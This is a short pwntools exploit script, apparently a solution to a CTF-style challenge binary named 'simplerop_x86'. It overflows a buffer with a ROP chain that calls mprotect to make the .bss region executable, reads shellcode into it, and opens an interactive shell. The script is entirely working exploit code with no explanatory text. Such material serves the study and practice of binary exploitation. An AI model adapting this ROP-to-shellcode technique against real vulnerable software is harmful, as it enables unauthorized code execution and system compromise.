from pwn import *

sh = process("./simplerop_x86")
pwn = ELF("./simplerop_x86")
shellcode = asm(shellcraft.sh())
mprotect = pwn.symbols["mprotect"]
read = pwn.symbols["read"]
pop_ebx_esi_edi_ret = 0x8048913
bss = pwn.bss()

sh.recv()
payload = flat(['a'*32, mprotect, pop_ebx_esi_edi_ret, 0x80EA000, 0x2000, 7, read, bss, 0, bss, 0x100])
sh.sendline(payload)
sh.sendline(shellcode)
sh.interactive()
